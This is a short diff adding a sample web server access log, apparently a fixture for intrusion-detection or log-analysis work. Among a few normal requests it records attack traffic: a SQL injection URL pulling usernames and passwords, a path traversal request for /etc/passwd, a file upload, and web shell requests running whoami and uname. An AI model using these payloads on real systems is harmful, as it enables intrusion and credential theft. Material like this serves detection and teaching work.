@@ -1,0 +1,8 @@
+192.168.1.50 - - [25/Oct/2026:05:01:10 +0000] "GET /index.php HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
+192.168.1.50 - - [25/Oct/2026:05:01:15 +0000] "GET /dashboard HTTP/1.1" 200 8912 "-" "Mozilla/5.0"
+203.0.113.195 - - [25/Oct/2026:05:05:22 +0000] "GET /login.php HTTP/1.1" 200 3120 "-" "Python-urllib/3.10"
+203.0.113.195 - - [25/Oct/2026:05:05:25 +0000] "GET /api/user?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 1250 "-" "sqlmap/1.7#stable"
+203.0.113.195 - - [25/Oct/2026:05:05:29 +0000] "GET /view.php?file=../../../../etc/passwd HTTP/1.1" 403 450 "-" "sqlmap/1.7#stable"
+203.0.113.195 - - [25/Oct/2026:05:06:01 +0000] "POST /upload.php HTTP/1.1" 200 840 "-" "curl/7.88.1"
+198.51.100.45 - - [25/Oct/2026:05:10:44 +0000] "GET /webshell.php?cmd=whoami HTTP/1.1" 200 32 "-" "Mozilla/5.0"
+198.51.100.45 - - [25/Oct/2026:05:11:02 +0000] "GET /webshell.php?cmd=id;uname%20-a HTTP/1.1" 200 88 "-" "Mozilla/5.0"
